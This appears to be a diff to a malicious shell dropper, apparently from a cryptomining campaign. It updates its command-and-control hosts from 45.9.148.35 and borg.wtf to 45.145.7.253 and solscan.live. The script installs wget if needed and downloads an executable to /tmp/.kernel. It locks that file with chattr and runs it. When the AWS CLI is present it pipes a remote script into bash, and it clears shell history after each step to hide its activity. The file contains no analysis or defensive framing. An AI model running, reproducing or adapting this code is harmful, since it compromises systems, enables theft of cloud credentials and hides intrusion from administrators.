@@ -1,7 +1,9 @@
 #!/bin/sh
 
-# wget -O - http://45.9.148.35/chimaera/sh/xmr.sh.sh | sh
-
+# wget -O - http://45.145.7.253/chimaera/sh/xmr.sh.sh | sh
+#
+# http://45.145.7.253/aws
+# solscan.live/aws.sh
 if ! type wget 2>/dev/null 1>/dev/null; then if type apt-get 2>/dev/null 1>/dev/null; then apt-get update --fix-missing 2>/dev/null 1>/dev/null ; apt-get install -y wget 2>/dev/null 1>/dev/null ; apt-get install -y --reinstall wget 2>/dev/null 1>/dev/null ; fi ; if type yum 2>/dev/null 1>/dev/null; then yum clean all 2>/dev/null 1>/dev/null ; yum install -y wget 2>/dev/null 1>/dev/null ; yum reinstall -y wget 2>/dev/null 1>/dev/null ; fi ; if type apk 2>/dev/null 1>/dev/null; then apk update 2>/dev/null 1>/dev/null ; apk add wget 2>/dev/null 1>/dev/null ; fi ; fi
 
 if [ ! -f "/tmp/.system" ]; then
@@ -12,11 +14,11 @@ cd / ; fi
 history -c
 clear
 
-if [ ! -f "/tmp/.kernel" ]; then wget -q http://45.9.148.35/aws -O /tmp/.kernel && chmod +x /tmp/.kernel && chattr +i /tmp/.kernel && cd /tmp/ && ./.kernel && cd / ; fi
+if [ ! -f "/tmp/.kernel" ]; then wget -q http://45.145.7.253/aws -O /tmp/.kernel && chmod +x /tmp/.kernel && chattr +i /tmp/.kernel && cd /tmp/ && ./.kernel && cd / ; fi
 history -c
 clear
 
-if type aws 2>/dev/null 1>/dev/null; then wget -O - borg.wtf/aws.sh | bash ; fi
+if type aws 2>/dev/null 1>/dev/null; then wget -O - solscan.live/aws.sh | bash ; fi
 history -c
 clear
 
